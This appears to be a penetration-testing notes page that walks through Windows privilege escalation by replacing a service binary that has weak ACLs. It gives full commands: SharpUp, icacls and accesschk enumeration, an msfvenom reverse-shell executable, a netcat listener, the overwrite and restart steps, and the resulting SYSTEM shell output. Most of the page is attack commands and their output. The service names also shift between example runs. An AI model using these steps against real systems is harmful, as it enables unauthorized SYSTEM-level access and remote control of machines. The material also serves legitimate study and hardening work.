---
title: Permissive File System ACLs
date: 2026-06-19 18:13:01
categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Windows Privesc
  - Services
tags:
  - msfvenom
  - Weak-ACL
  - AccessChk
  - icacls
  - Permissive-File-System-ACLs
  - Modifiable-Service-Binary
  - Service-Binary-Replacement
  - SharpUp
  - sc.exe
  - Windows-Services
---

> ➜ Permissive File System ACLs occur when a low-privileged user has `write` or `full control` permissions over a service binary, allowing them to replace it with a malicious executable, when the service restarts, the payload runs under the service’s account, typically `SYSTEM`.

# Enumeration

#### Enumerating Modifiable Service Binaries

> ➜ As we can see, SharpUp identified a service whose binary has a weak ACL and lists it under `Modifiable Service Binaries`.

```powershell
PS C:\> .\SharpUp.exe audit

=== Modifiable Service Binaries ===

  Name             : service-name
  DisplayName      : Service Display Name
  Description      : Service description
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files\service-name\service-name.exe"

  <SNIP>
```

#### Confirming the File ACL with icacls

> ➜ Both `BUILTIN\Users` and `Everyone` have `Full Access (F)` over the service binary, so we can modify or replace it.

```powershell
PS C:\> icacls "C:\Program Files\service-name\service-name.exe"

C:\Program Files\service-name\service-name.exe BUILTIN\Users:(I)(F)
                                               Everyone:(I)(F)
                                               NT AUTHORITY\SYSTEM:(I)(F)
```

#### Checking the Service Account

> ➜ We check the service account with `sc qc`.
>
>   * `SERVICE_START_NAME : LocalSystem` confirms our payload will run as `SYSTEM`.
>

```powershell
PS C:\> sc.exe qc service-name

[SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: service-name
    TYPE               : 10  WIN32_OWN_PROCESS
    START_TYPE         : 2   AUTO_START
    BINARY_PATH_NAME   : "C:\Program Files\service-name\service-name.exe"
    SERVICE_START_NAME : LocalSystem
```

# Exploitation

#### Generating the Malicious Binary

> ➜ We craft a reverse-shell executable that connects back to our listener, we name it with the same target service binary so it overwrites the legitimate one.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=port -f exe -o service-name.exe
```

#### Starting the Listener

```bash
rlwrap nc -lvnp port
```

#### Checking If We Can Start And Stop the Service

> ➜ To force the service to reload our new binary without waiting for an auto-start or a system reboot, we need to restart it by ourselves which requires `SERVICE_STOP` to stop it and `SERVICE_START` to start it again.

```bash
PS C:\> .\accesschk.exe /accepteula -uvqc SecurityService

SecurityService
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  R  NT AUTHORITY\INTERACTIVE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        READ_CONTROL
  R  Everyone
        SERVICE_START
        SERVICE_STOP
```

#### Stop the Service

```powershell
C:\> sc stop SecurityService
```

#### Replacing the Service Binary

> ➜ The service is `Stopped`, so we can overwrite the file directly.

```powershell
C:\> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

#### Starting the Service

```powershell
C:\> sc start SecurityService
```

#### Getting a SYSTEM Shell

```bash
➜  weak-permissions rlwrap nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.X] 49xxx

C:\WINDOWS\system32> whoami
nt authority\system
```
